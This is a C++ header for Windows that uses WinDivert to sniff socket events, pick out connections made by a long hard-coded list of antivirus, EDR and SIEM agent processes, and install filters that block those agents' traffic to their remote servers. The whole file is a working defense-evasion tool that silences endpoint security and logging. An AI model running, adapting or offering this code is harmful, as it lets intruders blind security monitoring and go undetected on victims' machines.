#pragma once

#include <winsock2.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <list>
#include <thread>
#include <algorithm>

#include <windivert.h>
#include <logger.h>
#include <safe_ptr.h>
#include <process_info.h>

namespace socket_connection {

    #define INET6_ADDRSTRLEN    45

    namespace {
        sf::safe_ptr<std::vector<std::string>> edr_process_name(
            std::vector<std::string>({              
                //av
                "ccsvchst",
                "smc",
                "mfetp",
                "mfeesp",
                "savservice",
                "savadminservice",
                "epconsole",
                "bdservicehost",
                "ekrn",
                "mbamservice",
                "wrsa",
                "avastsvc",
                "avastui",
                "avp",
                "f-secure",
                "sbamsvc",
                "psanhost",
                "psuaservice",
                "gdataavk",
                "avkservice",
                "a2service",
                "dwservice",
                "zaprivacyservice",
                "bullguardsvc",
                "avguard",
                "v3svc",
                "ntrtscan",
                "pccntmon",
                "cmdagent",
                "secureaplus",
                "heimdalclienthost",
                "trustwaveservice",
                "cybereasonransomfreeservice",
                "deepinstinctservice",
                "bdservicehost",
                "nortonsecurity",
                "avgsvc",
                "tmasoagent",
                "qhepsvc",
                "ntrtscan",
                "f-secure",
                "mcshield",
                "n360",
                "aswidsagent",
                "acnamagent",
                "acnamlogonagent",
                "bdagent",
                "vsserv",
                "clientcommunicationservice",
                "avgnt",
                "klwtblfs",
                "egui",
                "ekrn",
                "mcshield",
                "shstat",
                "panda_url_filtering",
                "pavfnsvr",
                "pavsrv",
                "psanhost",
                "savservice",
                "sophosav",
                "sophosclean",
                "sophoshealth",
                "sophossps",
                "sophosui",
                "windefend",
                "ccsvchst",
                "sfc",

                //edr/xdr/idr/ips/ids
                "csfalconservice",
                "cb",
                "cbdefense",
                "sentinelagent",
                "sentinelctl",
                "sentinelmemoryscanner",
                "sentinelservicehost",
                "sentinelstaticengine",
                "sentinelstaticenginescanner",
                "sesclu",
                "seplu",
                "mfefire",
                "mfeepmpk",
                "savservice",
                "savadminservice",
                "epconsole",
                "bdservicehost",
                "mbamservice",
                "wrsa",
                "avastsvc",
                "avastui",
                "avp",
                "xagt",
                "sfc",
                "cylancesvc",
                "cyveraservice",
                "cyveraconsole",
                "traps",
                "trapsagent",
                "trapsd",
                "ntrtscan",
                "pccntmon",
                "savservice",
                "savadminservice",
                "tracsrvwrapper",
                "cpda",
                "cmdagent",
                "cybereasonransomfreeservice",
                "elastic-endpoint",
                "cylancesvc",
                "airwatchservice",
                "nwservice",
                "mfeepehost",
                "arcsight",
                "heatsoftware",
                "zaprivacyservice",
                "gdataavk",
                "avkservice",
                "a2service",
                "dwservice",
                "heimdalclienthost",
                "secureaplus",
                "v3svc",
                "trustwaveservice",
                "bullguardsvc",
                "avguard",
                "fdedr",
                "cyserver",
                "blackberryprotect",
                "csfalconservice",
                "rapid7",
                "aciseagent",
                "acumbrellaagent",
                "appcontrolagent",
                "browserexploitdetection",
                "dataprotectionservice",
                "endpointbasecamp",
                "realtime scanservice",
                "samplingservice",
                "securityagentmonitor",
                "darktracetsa",
                "dsmonitor",
                "dwengine",
                "cytomicendpoint",
                "tanclient",
                "ccsvchst",
                "secureworks",
                "endgame",
                "fireeye",
                "fsecure",
                "hexis",
                "savservice",
                "symantec",
                "mcafee",
                "raytheon",
                "safe",
                "msmpeng",
                "mssense",
                "senseir",
                "sensendr",
                "sensecncproxy",
                "sensesampleuploader",
                "elastic-endpoint",
                "elastic-agent"

                //siem
                "splunkd",
                "qradar",
                "lragent",
                "arcsight",
                "ossec-agent",
                "sumo",
                "graylog-agent",
                "logpoint-agent",
                "solarwindssem",
                "nwservice",
                "nxtusm",
                "nxtsvc",
                "devo-agent",
                "usm-agent",
                "npmdagent"}
            )
        );
    }

    namespace {
        static HANDLE hMutex = CreateMutexA(NULL, FALSE, "thread_id_chk");
        static std::list<size_t> thread_id;
    }


    namespace {
        sf::safe_ptr<std::vector<std::pair<HANDLE, std::string>>> edr_block_filter(
            std::vector<std::pair<HANDLE, std::string>>({})
        );
    }

    // sniffing EDR's sockets for generate connections patterns
    static bool CheckEdrSocket(logger::ConnectionInfo& connection) {
        WaitForSingleObject(hMutex, INFINITE);
        
        std::transform(
            connection.process_name.begin(),
            connection.process_name.end(),
            connection.process_name.begin(),
            [](unsigned char c) { return std::tolower(c); }
        );

        for (auto edr_it = edr_process_name->begin(); edr_it != edr_process_name->end(); ++edr_it) {
            if (connection.process_name.find(*edr_it) != std::string::npos) {
                LOG_MSG().log_socket_sniffer("found edr connection");
                ReleaseMutex(hMutex);
                return true;
            }
        }

        ReleaseMutex(hMutex);
        return false;
    }

    static void SetThreadId(size_t thread_id_) {
        WaitForSingleObject(hMutex, INFINITE);
        thread_id.push_back(thread_id_);
        ReleaseMutex(hMutex);
    }

    static void HandleSockets(HANDLE handle) {
        WINDIVERT_ADDRESS addr;
        //char path[MAX_PATH + 1];
        char local_str[INET6_ADDRSTRLEN + 1], remote_str[INET6_ADDRSTRLEN + 1];
        logger::ConnectionInfo connection;

        if (!WinDivertRecv(handle, NULL, 0, NULL, &addr))
        {
            LOG_MSG().log_block_failed(GetLastError(), "failed to read packet");
            return;
        }

        switch (addr.Event)
        {
        case WINDIVERT_EVENT_SOCKET_BIND:
            connection.event_type = "BIND";
            break;
        case WINDIVERT_EVENT_SOCKET_LISTEN:
            connection.event_type = "LISTEN";
            break;
        case WINDIVERT_EVENT_SOCKET_CONNECT:
            connection.event_type = "CONNECT";
            break;
        case WINDIVERT_EVENT_SOCKET_ACCEPT:
            connection.event_type = "ACCEPT";
            break;
        case WINDIVERT_EVENT_SOCKET_CLOSE:
            connection.event_type = "CLOSE";
            break;
        default:
            connection.event_type = "???";
            break;
        }

        connection.process_id = addr.Socket.ProcessId;

        auto path = getProcessName(connection.process_id);

        /*auto process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, addr.Socket.ProcessId);
        auto path_len = 0;
        if (process != NULL)
        {
            path_len = GetProcessImageFileName(process, path, sizeof(path));
            CloseHandle(process);
        }*/
        if (!path.empty())
        {
            auto filename = PathFindFileNameA(path.c_str());
            connection.process_name = std::string(filename);
        }
        else if (addr.Socket.ProcessId == 4)
        {
            connection.process_name = "SYSTEM";
        }
        else
        {
            connection.process_name = "???";
        }

        connection.endpoint = addr.Socket.EndpointId;
        connection.parent_endpoint = addr.Socket.ParentEndpointId;

        switch (addr.Socket.Protocol)
        {
        case IPPROTO_TCP:
            connection.protocol = "TCP";
            break;
        case IPPROTO_UDP:
            connection.protocol = "UDP";
            break;
        case IPPROTO_ICMP:
            connection.protocol = "ICMP";
            break;
        case IPPROTO_ICMPV6:
            connection.protocol = "ICMPV6";
            break;
        default:
            connection.protocol = std::to_string(addr.Socket.Protocol);
            break;
        }

        WinDivertHelperFormatIPv6Address(addr.Socket.LocalAddr, local_str, sizeof(local_str));
        if (addr.Socket.LocalPort != 0 || strcmp(local_str, "::") != 0)
        {
            connection.src_address = std::string("[") + std::string(local_str) + std::string("]") + ":" + std::to_string(addr.Socket.LocalPort);
        }

        WinDivertHelperFormatIPv6Address(addr.Socket.RemoteAddr, remote_str, sizeof(remote_str));
        if (addr.Socket.RemotePort != 0 || strcmp(remote_str, "::") != 0)
        {
            connection.dst_address = std::string("[") + std::string(remote_str) + std::string("]") + ":" + std::to_string(addr.Socket.RemotePort);
        }

        WaitForSingleObject(hMutex, INFINITE);
        if (connection.event_type == "CONNECT" && addr.Socket.RemotePort != 53) {
            // check if the socket is from edr
            if (CheckEdrSocket(connection)) {
                LOG_MSG().log_block_accept(connection);
                // create block edr WFP filter
                auto block_filer = std::string("(remoteAddr == ") + std::string(remote_str) + std::string(") and (remotePort == ") + std::to_string(addr.Socket.RemotePort) + std::string(")");   
                
                // check block filter already exists
                for (auto edr_it = edr_block_filter->begin(); edr_it != edr_block_filter->end(); ++edr_it) {
                    if ((*edr_it).second == block_filer) {
                        LOG_MSG().log_block_filtered(connection);
                        ReleaseMutex(hMutex);
                        return;
                    }
                }
                // create new block filter handle  
                auto block_filter_handle = WinDivertOpen(block_filer.c_str(), WINDIVERT_LAYER_NETWORK, 0, 0);
                // add to edr block filter storage
                edr_block_filter->push_back(std::pair<HANDLE, std::string>({ block_filter_handle, block_filer }));
                LOG_MSG().log_block_add_filter(block_filer);
            }
        }
        ReleaseMutex(hMutex);

        LOG_MSG().log_block_accept(connection);
    }

    static void GetEdrConnectionsPattern(HANDLE handle) {
        while (1) {
            // check stop socket listener thread
            WaitForSingleObject(hMutex, INFINITE);
            for (auto id_iterator = thread_id.begin(); id_iterator != thread_id.end(); ++id_iterator) {
                    if (*id_iterator == std::hash<std::thread::id>{}(std::this_thread::get_id())) {
                        thread_id.erase(id_iterator);
                        LOG_MSG().log_socket_sniffer("stop sniffing");

                        // clear active block WFP filters
                        for (auto edr_it = edr_block_filter->begin(); edr_it != edr_block_filter->end(); ++edr_it) {                       
                            LOG_MSG().log_block_remove_filter((*edr_it).second);
                            // close actice filter
                            WinDivertClose((*edr_it).first);
                        }

                        // clear edr block filer storage
                        edr_block_filter->clear();

                        // exit main monitor thread
                        ReleaseMutex(hMutex);
                        ExitThread(0);
                    }
            }
            ReleaseMutex(hMutex);

            // check connections
            HandleSockets(handle);
        }
    }
}